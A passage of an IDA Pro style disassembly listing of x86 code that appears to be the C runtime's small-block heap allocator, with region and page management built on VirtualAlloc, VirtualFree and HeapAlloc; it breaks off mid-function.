.text:00404344 ; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD "+" TO EXPAND]
.text:004043F5 ; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD "+" TO EXPAND]
.text:004044F0
.text:004044F0 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004044F0
.text:004044F0
.text:004044F0 sub_4044F0      proc near               ; CODE XREF: sub_4026A0+41p
.text:004044F0                                         ; sub_4047E8:loc_4049B7p
.text:004044F0                 cmp     dword_407840, 0FFFFFFFFh
.text:004044F7                 push    ebx
.text:004044F8                 push    ebp
.text:004044F9                 push    esi
.text:004044FA                 push    edi
.text:004044FB                 jnz     short loc_404504
.text:004044FD                 mov     esi, offset off_407830
.text:00404502                 jmp     short loc_404521
.text:00404504 ; ---------------------------------------------------------------------------
.text:00404504
.text:00404504 loc_404504:                             ; CODE XREF: sub_4044F0+Bj
.text:00404504                 push    2020h           ; dwBytes
.text:00404509                 push    0               ; dwFlags
.text:0040450B                 push    hHeap           ; hHeap
.text:00404511                 call    ds:HeapAlloc
.text:00404517                 mov     esi, eax
.text:00404519                 test    esi, esi
.text:0040451B                 jz      loc_40462D
.text:00404521
.text:00404521 loc_404521:                             ; CODE XREF: sub_4044F0+12j
.text:00404521                 mov     ebp, ds:VirtualAlloc
.text:00404527                 push    4               ; flProtect
.text:00404529                 push    2000h           ; flAllocationType
.text:0040452E                 push    400000h         ; dwSize
.text:00404533                 push    0               ; lpAddress
.text:00404535                 call    ebp ; VirtualAlloc
.text:00404537                 mov     edi, eax
.text:00404539                 test    edi, edi
.text:0040453B                 jz      loc_404616
.text:00404541                 push    4               ; flProtect
.text:00404543                 mov     ebx, 10000h
.text:00404548                 push    1000h           ; flAllocationType
.text:0040454D                 push    ebx             ; dwSize
.text:0040454E                 push    edi             ; lpAddress
.text:0040454F                 call    ebp ; VirtualAlloc
.text:00404551                 test    eax, eax
.text:00404553                 jz      loc_404608
.text:00404559                 mov     eax, offset off_407830
.text:0040455E                 cmp     esi, eax
.text:00404560                 jnz     short loc_404580
.text:00404562                 cmp     off_407830, 0
.text:00404569                 jnz     short loc_404570
.text:0040456B                 mov     off_407830, eax
.text:00404570
.text:00404570 loc_404570:                             ; CODE XREF: sub_4044F0+79j
.text:00404570                 cmp     off_407834, 0
.text:00404577                 jnz     short loc_404595
.text:00404579                 mov     off_407834, eax
.text:0040457E                 jmp     short loc_404595
.text:00404580 ; ---------------------------------------------------------------------------
.text:00404580
.text:00404580 loc_404580:                             ; CODE XREF: sub_4044F0+70j
.text:00404580                 mov     [esi], eax
.text:00404582                 mov     eax, off_407834
.text:00404587                 mov     [esi+4], eax
.text:0040458A                 mov     off_407834, esi
.text:00404590                 mov     eax, [esi+4]
.text:00404593                 mov     [eax], esi
.text:00404595
.text:00404595 loc_404595:                             ; CODE XREF: sub_4044F0+87j
.text:00404595                                         ; sub_4044F0+8Ej
.text:00404595                 lea     eax, [edi+400000h]
.text:0040459B                 lea     ecx, [esi+98h]
.text:004045A1                 mov     [esi+14h], eax
.text:004045A4                 lea     eax, [esi+18h]
.text:004045A7                 mov     [esi+0Ch], ecx
.text:004045AA                 mov     [esi+10h], edi
.text:004045AD                 mov     [esi+8], eax
.text:004045B0                 xor     ebp, ebp
.text:004045B2                 mov     ecx, 0F1h
.text:004045B7
.text:004045B7 loc_4045B7:                             ; CODE XREF: sub_4044F0+E2j
.text:004045B7                 xor     edx, edx
.text:004045B9                 cmp     ebp, 10h
.text:004045BC                 setnl   dl
.text:004045BF                 dec     edx
.text:004045C0                 and     edx, ecx
.text:004045C2                 dec     edx
.text:004045C3                 inc     ebp
.text:004045C4                 mov     [eax], edx
.text:004045C6                 mov     [eax+4], ecx
.text:004045C9                 add     eax, 8
.text:004045CC                 cmp     ebp, 400h
.text:004045D2                 jl      short loc_4045B7
.text:004045D4                 push    ebx             ; size_t
.text:004045D5                 push    0               ; int
.text:004045D7                 push    edi             ; void *
.text:004045D8                 call    _memset
.text:004045DD                 add     esp, 0Ch
.text:004045E0
.text:004045E0 loc_4045E0:                             ; CODE XREF: sub_4044F0+112j
.text:004045E0                 mov     eax, [esi+10h]
.text:004045E3                 add     eax, ebx
.text:004045E5                 cmp     edi, eax
.text:004045E7                 jnb     short loc_404604
.text:004045E9                 or      byte ptr [edi+0F8h], 0FFh
.text:004045F0                 lea     eax, [edi+8]
.text:004045F3                 mov     [edi], eax
.text:004045F5                 mov     dword ptr [edi+4], 0F0h
.text:004045FC                 add     edi, 1000h
.text:00404602                 jmp     short loc_4045E0
.text:00404604 ; ---------------------------------------------------------------------------
.text:00404604
.text:00404604 loc_404604:                             ; CODE XREF: sub_4044F0+F7j
.text:00404604                 mov     eax, esi
.text:00404606                 jmp     short loc_40462F
.text:00404608 ; ---------------------------------------------------------------------------
.text:00404608
.text:00404608 loc_404608:                             ; CODE XREF: sub_4044F0+63j
.text:00404608                 push    8000h           ; dwFreeType
.text:0040460D                 push    0               ; dwSize
.text:0040460F                 push    edi             ; lpAddress
.text:00404610                 call    ds:VirtualFree
.text:00404616
.text:00404616 loc_404616:                             ; CODE XREF: sub_4044F0+4Bj
.text:00404616                 cmp     esi, offset off_407830
.text:0040461C                 jz      short loc_40462D
.text:0040461E                 push    esi             ; lpMem
.text:0040461F                 push    0               ; dwFlags
.text:00404621                 push    hHeap           ; hHeap
.text:00404627                 call    ds:HeapFree
.text:0040462D
.text:0040462D loc_40462D:                             ; CODE XREF: sub_4044F0+2Bj
.text:0040462D                                         ; sub_4044F0+12Cj
.text:0040462D                 xor     eax, eax
.text:0040462F
.text:0040462F loc_40462F:                             ; CODE XREF: sub_4044F0+116j
.text:0040462F                 pop     edi
.text:00404630                 pop     esi
.text:00404631                 pop     ebp
.text:00404632                 pop     ebx
.text:00404633                 retn
.text:00404633 sub_4044F0      endp
.text:00404633
.text:00404634
.text:00404634 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00404634
.text:00404634
.text:00404634 sub_404634      proc near               ; CODE XREF: sub_40468A+A5p
.text:00404634
.text:00404634 arg_0           = dword ptr  8
.text:00404634
.text:00404634                 push    esi
.text:00404635                 mov     esi, [esp+arg_0]
.text:00404639                 push    8000h           ; dwFreeType
.text:0040463E                 push    0               ; dwSize
.text:00404640                 push    dword ptr [esi+10h] ; lpAddress
.text:00404643                 call    ds:VirtualFree
.text:00404649                 cmp     off_409850, esi
.text:0040464F                 jnz     short loc_404659
.text:00404651                 mov     eax, [esi+4]
.text:00404654                 mov     off_409850, eax
.text:00404659
.text:00404659 loc_404659:                             ; CODE XREF: sub_404634+1Bj
.text:00404659                 cmp     esi, offset off_407830
.text:0040465F                 jz      short loc_404681
.text:00404661                 mov     eax, [esi+4]
.text:00404664                 mov     ecx, [esi]
.text:00404666                 push    esi             ; lpMem
.text:00404667                 push    0               ; dwFlags
.text:00404669                 mov     [eax], ecx
.text:0040466B                 mov     eax, [esi]
.text:0040466D                 mov     ecx, [esi+4]
.text:00404670                 mov     [eax+4], ecx
.text:00404673                 push    hHeap           ; hHeap
.text:00404679                 call    ds:HeapFree
.text:0040467F                 pop     esi
.text:00404680                 retn
.text:00404681 ; ---------------------------------------------------------------------------
.text:00404681
.text:00404681 loc_404681:                             ; CODE XREF: sub_404634+2Bj
.text:00404681                 or      dword_407840, 0FFFFFFFFh
.text:00404688                 pop     esi
.text:00404689                 retn
.text:00404689 sub_404634      endp
.text:00404689
.text:0040468A
.text:0040468A ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:0040468A
.text:0040468A ; Attributes: bp-based frame
.text:0040468A
.text:0040468A sub_40468A      proc near               ; CODE XREF: sub_4047A3+3Ep
.text:0040468A
.text:0040468A var_4           = dword ptr -4
.text:0040468A arg_0           = dword ptr  8
.text:0040468A
.text:0040468A                 push    ebp
.text:0040468B                 mov     ebp, esp
.text:0040468D                 push    ecx
.text:0040468E                 push    ebx
.text:0040468F                 push    esi
.text:00404690                 mov     esi, off_407834
.text:00404696                 push    edi
.text:00404697
.text:00404697 loc_404697:                             ; CODE XREF: sub_40468A+B7j
.text:00404697                 cmp     dword ptr [esi+10h], 0FFFFFFFFh
.text:0040469B                 jz      loc_404735
.text:004046A1                 and     [ebp+var_4], 0
.text:004046A5                 lea     edi, [esi+2010h]
.text:004046AB                 mov     ebx, 3FF000h
.text:004046B0
.text:004046B0 loc_4046B0:                             ; CODE XREF: sub_40468A+72j
.text:004046B0                 cmp     dword ptr [edi], 0F0h
.text:004046B6                 jnz     short loc_4046F1
.text:004046B8                 mov     eax, ebx
.text:004046BA                 push    4000h           ; dwFreeType
.text:004046BF                 add     eax, [esi+10h]
.text:004046C2                 push    1000h           ; dwSize
.text:004046C7                 push    eax             ; lpAddress
.text:004046C8                 call    ds:VirtualFree
.text:004046CE                 test    eax, eax
.text:004046D0                 jz      short loc_4046F1
.text:004046D2                 or      dword ptr [edi], 0FFFFFFFFh
.text:004046D5                 dec     dword_409B50
.text:004046DB                 mov     eax, [esi+0Ch]
.text:004046DE                 test    eax, eax
.text:004046E0                 jz      short loc_4046E6
.text:004046E2                 cmp     eax, edi
.text:004046E4                 jbe     short loc_4046E9
.text:004046E6
.text:004046E6 loc_4046E6:                             ; CODE XREF: sub_40468A+56j
.text:004046E6                 mov     [esi+0Ch], edi
.text:004046E9
.text:004046E9 loc_4046E9:                             ; CODE XREF: sub_40468A+5Aj
.text:004046E9                 inc     [ebp+var_4]
.text:004046EC                 dec     [ebp+arg_0]
.text:004046EF                 jz      short loc_4046FE
.text:004046F1
.text:004046F1 loc_4046F1:                             ; CODE XREF: sub_40468A+2Cj
.text:004046F1                                         ; sub_40468A+46j
.text:004046F1                 sub     ebx, 1000h
.text:004046F7                 sub     edi, 8
.text:004046FA                 test    ebx, ebx
.text:004046FC                 jge     short loc_4046B0
.text:004046FE
.text:004046FE loc_4046FE:                             ; CODE XREF: sub_40468A+65j
.text:004046FE                 cmp     [ebp+var_4], 0
.text:00404702                 mov     ecx, esi
.text:00404704                 mov     esi, [esi+4]
.text:00404707                 jz      short loc_404735
.text:00404709                 cmp     dword ptr [ecx+18h], 0FFFFFFFFh
.text:0040470D                 jnz     short loc_404735
.text:0040470F                 push    1
.text:00404711                 lea     eax, [ecx+20h]
.text:00404714                 pop     edx
.text:00404715
.text:00404715 loc_404715:                             ; CODE XREF: sub_40468A+9Aj
.text:00404715                 cmp     dword ptr [eax], 0FFFFFFFFh
.text:00404718                 jnz     short loc_404726
.text:0040471A                 inc     edx
.text:0040471B                 add     eax, 8
.text:0040471E                 cmp     edx, 400h
.text:00404724                 jl      short loc_404715
.text:00404726
.text:00404726 loc_404726:                             ; CODE XREF: sub_40468A+8Ej
.text:00404726                 cmp     edx, 400h
.text:0040472C                 jnz     short loc_404735
.text:0040472E                 push    ecx
.text:0040472F                 call    sub_404634
.text:00404734                 pop     ecx
.text:00404735
.text:00404735 loc_404735:                             ; CODE XREF: sub_40468A+11j
.text:00404735                                         ; sub_40468A+7Dj ...
.text:00404735                 cmp     esi, off_407834
.text:0040473B                 jz      short loc_404747
.text:0040473D                 cmp     [ebp+arg_0], 0
.text:00404741                 jg      loc_404697
.text:00404747
.text:00404747 loc_404747:                             ; CODE XREF: sub_40468A+B1j
.text:00404747                 pop     edi
.text:00404748                 pop     esi
.text:00404749                 pop     ebx
.text:0040474A                 leave
.text:0040474B                 retn
.text:0040474B sub_40468A      endp
.text:0040474B
.text:0040474C
.text:0040474C ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:0040474C
.text:0040474C
.text:0040474C sub_40474C      proc near               ; CODE XREF: sub_402C41+3Ap
.text:0040474C
.text:0040474C arg_0           = dword ptr  4
.text:0040474C arg_4           = dword ptr  8
.text:0040474C arg_8           = dword ptr  0Ch
.text:0040474C
.text:0040474C                 mov     eax, [esp+arg_0]
.text:00404750                 mov     edx, offset off_407830
.text:00404755                 push    esi
.text:00404756                 mov     ecx, edx
.text:00404758
.text:00404758 loc_404758:                             ; CODE XREF: sub_40474C+1Cj
.text:00404758                 cmp     eax, [ecx+10h]
.text:0040475B                 jbe     short loc_404762
.text:0040475D                 cmp     eax, [ecx+14h]
.text:00404760                 jb      short loc_40476A
.text:00404762
.text:00404762 loc_404762:                             ; CODE XREF: sub_40474C+Fj
.text:00404762                 mov     ecx, [ecx]
.text:00404764                 cmp     ecx, edx
.text:00404766                 jz      short loc_40479F
.text:00404768                 jmp     short loc_404758
.text:0040476A ; ---------------------------------------------------------------------------
.text:0040476A
.text:0040476A loc_40476A:                             ; CODE XREF: sub_40474C+14j
.text:0040476A                 test    al, 0Fh
.text:0040476C                 jnz     short loc_40479F
.text:0040476E                 mov     esi, eax
.text:00404770                 mov     edx, 100h
.text:00404775                 and     esi, 0FFFh
.text:0040477B                 cmp     esi, edx
.text:0040477D                 jb      short loc_40479F
.text:0040477F                 mov     esi, [esp+4+arg_4]
.text:00404783                 mov     [esi], ecx
.text:00404785                 mov     esi, [esp+4+arg_8]
.text:00404789                 mov     ecx, eax
.text:0040478B                 and     cx, 0F000h
.text:00404790                 sub     eax, ecx
.text:00404792                 mov     [esi], ecx
.text:00404794                 sub     eax, edx
.text:00404796                 pop     esi
.text:00404797                 sar     eax, 4
.text:0040479A                 lea     eax, [eax+ecx+8]
.text:0040479E                 retn
.text:0040479F ; ---------------------------------------------------------------------------
.text:0040479F
.text:0040479F loc_40479F:                             ; CODE XREF: sub_40474C+1Aj
.text:0040479F                                         ; sub_40474C+20j ...
.text:0040479F                 xor     eax, eax
.text:004047A1                 pop     esi
.text:004047A2                 retn
.text:004047A2 sub_40474C      endp
.text:004047A2
.text:004047A3
.text:004047A3 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004047A3
.text:004047A3
.text:004047A3 sub_4047A3      proc near               ; CODE XREF: sub_402C41+4Dp
.text:004047A3
.text:004047A3 arg_0           = dword ptr  4
.text:004047A3 arg_4           = dword ptr  8
.text:004047A3 arg_8           = dword ptr  0Ch
.text:004047A3
.text:004047A3                 mov     eax, [esp+arg_0]
.text:004047A7                 mov     ecx, [esp+arg_4]
.text:004047AB                 sub     ecx, [eax+10h]
.text:004047AE                 sar     ecx, 0Ch
.text:004047B1                 lea     eax, [eax+ecx*8+18h]
.text:004047B5                 mov     ecx, [esp+arg_8]
.text:004047B9                 movzx   edx, byte ptr [ecx]
.text:004047BC                 add     [eax], edx
.text:004047BE                 and     byte ptr [ecx], 0
.text:004047C1                 cmp     dword ptr [eax], 0F0h
.text:004047C7                 mov     dword ptr [eax+4], 0F1h
.text:004047CE                 jnz     short locret_4047E7
.text:004047D0                 inc     dword_409B50
.text:004047D6                 cmp     dword_409B50, 20h
.text:004047DD                 jnz     short locret_4047E7
.text:004047DF                 push    10h
.text:004047E1                 call    sub_40468A
.text:004047E6                 pop     ecx
.text:004047E7
.text:004047E7 locret_4047E7:                          ; CODE XREF: sub_4047A3+2Bj
.text:004047E7                                         ; sub_4047A3+3Aj
.text:004047E7                 retn
.text:004047E7 sub_4047A3      endp
.text:004047E7
.text:004047E8
.text:004047E8 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004047E8
.text:004047E8 ; Attributes: bp-based frame
.text:004047E8
.text:004047E8 sub_4047E8      proc near               ; CODE XREF: sub_402A9A+4Ap
.text:004047E8                                         ; sub_402F9A+5Fp
.text:004047E8
.text:004047E8 var_8           = dword ptr -8
.text:004047E8 var_4           = dword ptr -4
.text:004047E8 arg_0           = dword ptr  8
.text:004047E8
.text:004047E8                 push    ebp
.text:004047E9                 mov     ebp, esp
.text:004047EB                 push    ecx
.text:004047EC                 push    ecx
.text:004047ED                 push    ebx
.text:004047EE                 push    esi
.text:004047EF                 mov     esi, off_409850
.text:004047F5                 push    edi
.text:004047F6
.text:004047F6 loc_4047F6:                             ; CODE XREF: sub_4047E8+C6j
.text:004047F6                 mov     edx, [esi+10h]
.text:004047F9                 cmp     edx, 0FFFFFFFFh
.text:004047FC                 jz      loc_4048A1
.text:00404802                 mov     edi, [esi+8]
.text:00404805                 lea     ecx, [esi+2018h]
.text:0040480B                 mov     eax, edi
.text:0040480D                 sub     eax, esi
.text:0040480F                 sub     eax, 18h
.text:00404812                 sar     eax, 3
.text:00404815                 shl     eax, 0Ch
.text:00404818                 add     eax, edx
.text:0040481A                 cmp     edi, ecx
.text:0040481C                 mov     [ebp+var_4], eax
.text:0040481F                 jnb     short loc_40485B
.text:00404821
.text:00404821 loc_404821:                             ; CODE XREF: sub_4047E8+6Fj
.text:00404821                 mov     ecx, [edi]
.text:00404823                 mov     ebx, [ebp+arg_0]
.text:00404826                 cmp     ecx, ebx
.text:00404828                 jl      short loc_404844
.text:0040482A                 cmp     [edi+4], ebx
.text:0040482D                 jbe     short loc_404844
.text:0040482F                 push    ebx
.text:00404830                 push    ecx
.text:00404831                 push    eax
.text:00404832                 call    sub_4049F0
.text:00404837                 add     esp, 0Ch
.text:0040483A                 test    eax, eax
.text:0040483C                 jnz     short loc_4048B3
.text:0040483E                 mov     eax, [ebp+var_4]
.text:00404841                 mov     [edi+4], ebx
.text:00404844
.text:00404844 loc_404844:                             ; CODE XREF: sub_4047E8+40j
.text:00404844                                         ; sub_4047E8+45j
.text:00404844                 add     edi, 8
.text:00404847                 lea     ecx, [esi+2018h]
.text:0040484D                 add     eax, 1000h
.text:00404852                 cmp     edi, ecx
.text:00404854                 mov     [ebp+var_4], eax
.text:00404857                 jb      short loc_404821
.text:00404859                 jmp     short loc_40485E
.text:0040485B ; ---------------------------------------------------------------------------
.text:0040485B
.text:0040485B loc_40485B:                             ; CODE XREF: sub_4047E8+37j
.text:0040485B                 mov     ebx, [ebp+arg_0]
.text:0040485E
.text:0040485E loc_40485E:                             ; CODE XREF: sub_4047E8+71j
.text:0040485E                 mov     eax, [esi+8]
.text:00404861                 mov     ecx, [esi+10h]
.text:00404864                 lea     edi, [esi+18h]
.text:00404867                 mov     [ebp+var_8], eax
.text:0040486A                 cmp     edi, eax
.text:0040486C                 mov     [ebp+var_4], ecx
.text:0040486F                 jnb     short loc_4048A4
.text:00404871
.text:00404871 loc_404871:                             ; CODE XREF: sub_4047E8+B5j
.text:00404871                 mov     eax, [edi]
.text:00404873                 cmp     eax, ebx
.text:00404875                 jl      short loc_404890
.text:00404877                 cmp     [edi+4], ebx
.text:0040487A                 jbe     short loc_404890
.text:0040487C                 push    ebx
.text:0040487D                 push    eax
.text:0040487E                 push    [ebp+var_4]
.text:00404881                 call    sub_4049F0
.text:00404886                 add     esp, 0Ch
.text:00404889                 test    eax, eax
.text:0040488B                 jnz     short loc_4048B3
.text:0040488D                 mov     [edi+4], ebx
.text:00404890
.text:00404890 loc_404890:                             ; CODE XREF: sub_4047E8+8Dj
.text:00404890                                         ; sub_4047E8+92j
.text:00404890                 add     [ebp+var_4], 1000h
.text:00404897                 add     edi, 8
.text:0040489A                 cmp     edi, [ebp+var_8]
.text:0040489D                 jb      short loc_404871
.text:0040489F                 jmp     short loc_4048A4
.text:004048A1 ; ---------------------------------------------------------------------------
.text:004048A1
.text:004048A1 loc_4048A1:                             ; CODE XREF: sub_4047E8+14j
.text:004048A1                 mov     ebx, [ebp+arg_0]
.text:004048A4
.text:004048A4 loc_4048A4:                             ; CODE XREF: sub_4047E8+87j
.text:004048A4                                         ; sub_4047E8+B7j
.text:004048A4                 mov     esi, [esi]
.text:004048A6                 cmp     esi, off_409850
.text:004048AC                 jz      short loc_4048C3
.text:004048AE                 jmp     loc_4047F6
.text:004048B3 ; ---------------------------------------------------------------------------
.text:004048B3
.text:004048B3 loc_4048B3:                             ; CODE XREF: sub_4047E8+54j
.text:004048B3                                         ; sub_4047E8+A3j
.text:004048B3                 mov     off_409850, esi
.text:004048B9                 sub     [edi], ebx
.text:004048BB                 mov     [esi+8], edi
.text:004048BE                 jmp     loc_4049EB
.text:004048C3 ; ---------------------------------------------------------------------------
.text:004048C3
.text:004048C3 loc_4048C3:                             ; CODE XREF: sub_4047E8+C4j
.text:004048C3                 mov     eax, offset off_407830
.text:004048C8                 mov     edi, eax
.text:004048CA
.text:004048CA loc_4048CA:                             ; CODE XREF: sub_4047E8+F8j
.text:004048CA                 cmp     dword ptr [edi+10h], 0FFFFFFFFh
.text:004048CE                 jz      short loc_4048D6
.text:004048D0                 cmp     dword ptr [edi+0Ch], 0
.text:004048D4                 jnz     short loc_4048E2
.text:004048D6
.text:004048D6 loc_4048D6:                             ; CODE XREF: sub_4047E8+E6j
.text:004048D6                 mov     edi, [edi]
.text:004048D8                 cmp     edi, eax
.text:004048DA                 jz      loc_4049B7
.text:004048E0                 jmp     short loc_4048CA
.text:004048E2 ; ---------------------------------------------------------------------------
.text:004048E2
.text:004048E2 loc_4048E2:                             ; CODE XREF: sub_4047E8+ECj
.text:004048E2                 mov     ebx, [edi+0Ch]
.text:004048E5                 and     [ebp+var_4], 0
.text:004048E9                 mov     esi, ebx
.text:004048EB                 mov     eax, ebx
.text:004048ED                 sub     esi, edi
.text:004048EF                 sub     esi, 18h
.text:004048F2                 sar     esi, 3
.text:004048F5                 shl     esi, 0Ch
.text:004048F8                 add     esi, [edi+10h]
.text:004048FB                 cmp     dword ptr [ebx], 0FFFFFFFFh
.text:004048FE                 jnz     short loc_404911
.text:00404900
.text:00404900 loc_404900:                             ; CODE XREF: sub_4047E8+127j
.text:00404900                 cmp     [ebp+var_4], 10h
.text:00404904                 jge     short loc_404911
.text:00404906                 add     eax, 8
.text:00404909                 inc     [ebp+var_4]
.text:0040490C                 cmp     dword ptr [eax], 0FFFFFFFFh
.text:0040490F                 jz      short loc_404900
.text:00404911
.text:00404911 loc_404911:                             ; CODE XREF: sub_4047E8+116j
.text:00404911                                         ; sub_4047E8+11Cj
.text:00404911                 mov     eax, [ebp+var_4]
.text:00404914                 push    4               ; flProtect
.text:00404916                 shl     eax, 0Ch
.text:00404919                 push    1000h           ; flAllocationType
.text:0040491E                 push    eax             ; dwSize
.text:0040491F                 push    esi             ; lpAddress
.text:00404920                 mov     [ebp+var_8], eax
.text:00404923                 call    ds:VirtualAlloc
.text:00404929                 cmp     eax, esi
.text:0040492B                 jnz     loc_4049E9
.text:00404931                 push    0               ; size_t
.text:00404933                 push    [ebp+var_8]     ; int
.text:00404936                 push    esi             ; void *
.text:00404937                 call    _memset
.text:0040493C                 mov     edx, [ebp+var_4]
.text:0040493F                 add     esp, 0Ch
.text:00404942                 test    edx, edx
.text:00404944                 mov     ecx, ebx
.text:00404946                 jle     short loc_404978
.text:00404948                 lea     eax, [esi+4]
.text:0040494B                 mov     [ebp+var_4], edx
.text:0040494E
.text:0040494E loc_40494E:                             ; CODE XREF: sub_4047E8+18Ej
.text:0040494E                 or      byte ptr [eax+0F4h], 0FFh
.text:00404955                 lea     edx, [eax+4]
.text:00404958                 mov     [eax-4], edx
.text:0040495B                 mov     edx, 0F0h
.text:00404960                 mov     [eax], edx
.text:00404962                 mov     [ecx], edx
.text:00404964                 mov     dword ptr [ecx+4], 0F1h
.text:0040496B                 add     eax, 1000h
.text:00404970                 add     ecx, 8
.text:00404973                 dec     [ebp+var_4]
.text:00404976                 jnz     short loc_40494E
.text:00404978
.text:00404978 loc_404978:                             ; CODE XREF: sub_4047E8+15Ej
.text:00404978                 mov     off_409850, edi
.text:0040497E                 lea     eax, [edi+2018h]
.text:00404984
.text:00404984 loc_404984:                             ; CODE XREF: sub_4047E8+1A8j
.text:00404984                 cmp     ecx, eax
.text:00404986                 jnb     short loc_404994
.text:00404988                 cmp     dword ptr [ecx], 0FFFFFFFFh
.text:0040498B                 jz      short loc_404992
.text:0040498D                 add     ecx, 8
.text:00404990                 jmp     short loc_404984
.text:00404992 ; ---------------------------------------------------------------------------
.text:00404992
.text:00404992 loc_404992:                             ; CODE XREF: sub_4047E8+1A3j
.text:00404992                 cmp     ecx, eax
.text:00404994
.text:00404994 loc_404994:                             ; CODE XREF: sub_4047E8+19Ej
.text:00404994                 sbb     eax, eax
.text:00404996                 and     eax, ecx
.text:00404998                 mov     [edi+0Ch], eax
.text:0040499B                 mov     eax, [ebp+arg_0]
.text:0040499E                 mov     [esi+8], al
.text:004049A1                 mov     [edi+8], ebx
.text:004049A4                 sub     [ebx], eax
.text:004049A6                 sub     [esi+4], eax
.text:004049A9                 lea     ecx, [esi+eax+8]
.text:004049AD                 lea     eax, [esi+100h]
.text:004049B3                 mov     [esi], ecx
.text:004049B5                 jmp     short loc_4049EB
.text:004049B7 ; ---------------------------------------------------------------------------
.text:004049B7
.text:004049B7 loc_4049B7:                             ; CODE XREF: sub_4047E8+F2j
.text:004049B7                 call    sub_4044F0
.text:004049BC                 test    eax, eax
.text:004049BE                 jz      short loc_4049E9
.text:004049C0                 mov     ecx, [eax+10h]
.text:004049C3                 mov     [ecx+8], bl
.text:004049C6                 lea     edx, [ecx+ebx+8]
.text:004049CA                 mov     off_409850, eax
.text:004049CF                 mov     [ecx], edx
.text:004049D1                 mov     edx, 0F0h
.text:004049D6                 sub     edx, ebx
.text:004049D8                 mov     [ecx+4], edx
.text:004049DB                 movzx   edx, bl
.text:004049DE                 sub     [eax+18h], edx
.text:004049E1                 lea     eax, [ecx+100h]
.text:004049E7                 jmp     short loc_4049EB
.text:004049E9 ; ---------------------------------------------------------------------------
.text:004049E9
.text:004049E9 loc_4049E9:                             ; CODE XREF: sub_4047E8+143j
.text:004049E9                                         ; sub_4047E8+1D6j
.text:004049E9                 xor     eax, eax
.text:004049EB
.text:004049EB loc_4049EB:                             ; CODE XREF: sub_4047E8+D6j
.text:004049EB                                         ; sub_4047E8+1CDj ...
.text:004049EB                 pop     edi
.text:004049EC                 pop     esi
.text:004049ED                 pop     ebx
.text:004049EE                 leave
.text:004049EF                 retn
.text:004049EF sub_4047E8      endp
.text:004049EF
.text:004049F0
.text:004049F0 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004049F0
.text:004049F0 ; Attributes: bp-based frame
.text:004049F0
.text:004049F0 sub_4049F0      proc near               ; CODE XREF: sub_4047E8+4Ap
.text:004049F0                                         ; sub_4047E8+99p
.text:004049F0
.text:004049F0 var_4           = dword ptr -4
.text:004049F0 arg_0           = dword ptr  8
.text:004049F0 arg_4           = dword ptr  0Ch
.text:004049F0 arg_8           = dword ptr  10h
.text:004049F0
.text:004049F0                 push    ebp
.text:004049F1                 mov     ebp, esp
.text:004049F3                 push    ecx
.text:004049F4                 mov     ecx, [ebp+arg_0]
.text:004049F7                 mov     edx, [ebp+arg_8]
.text:004049FA                 push    ebx
.text:004049FB                 push    esi
.text:004049FC                 mov     esi, [ecx+4]
.text:004049FF                 push    edi
.text:00404A00                 mov     edi, [ecx]
.text:00404A02                 lea     ebx, [ecx+0F8h]
.text:00404A08                 cmp     esi, edx
.text:00404A0A                 mov     [ebp+var_4], edi
.text:00404A0D                 mov     eax, edi
.text:00404A0F                 mov     [ebp+arg_0], ebx
.text:00404A12                 jb      short loc_404A35
.text:00404A14                 lea     eax, [edi+edx]
.text:00404A17                 mov     [edi], dl
.text:00404A19                 cmp     eax, ebx
.text:00404A1B                 jnb     short loc_404A24
.text:00404A1D                 add     [ecx], edx
.text:00404A1F                 sub     [ecx+4], edx
.text:00404A22                 jmp     short loc_404A2D
.text:00404A24 ; ---------------------------------------------------------------------------
.text:00404A24
.text:00404A24 loc_404A24:                             ; CODE XREF: sub_4049F0+2Bj
.text:00404A24                 and     dword ptr [ecx+4], 0
.text:00404A28                 lea     eax, [ecx+8]
.text:00404A2B                 mov     [ecx], eax
.text:00404A2D
.text:00404A2D loc_404A2D:                             ; CODE XREF: sub_4049F0+32j
.text:00404A2D                 lea     eax, [edi+8]
.text:00404A30                 jmp     loc_404B03
.text:00404A35 ; ---------------------------------------------------------------------------
.text:00404A35
.text:00404A35 loc_404A35:                             ; CODE XREF: sub_4049F0+22j
.text:00404A35                 add     esi, edi
.text:00404A37                 cmp     byte ptr [esi], 0
.text:00404A3A                 jz      short loc_404A3E
.text:00404A3C                 mov     eax, esi
.text:00404A3E
.text:00404A3E loc_404A3E:                             ; CODE XREF: sub_4049F0+4Aj
.text:00404A3E                 lea     esi, [eax+edx]
.text:00404A41                 cmp     esi, ebx
.text:00404A43                 jnb     short loc_404A88
.text:00404A45
.text:00404A45 loc_404A45:                             ; CODE XREF: sub_4049F0+96j
.text:00404A45                 mov     bl, [eax]
.text:00404A47                 test    bl, bl
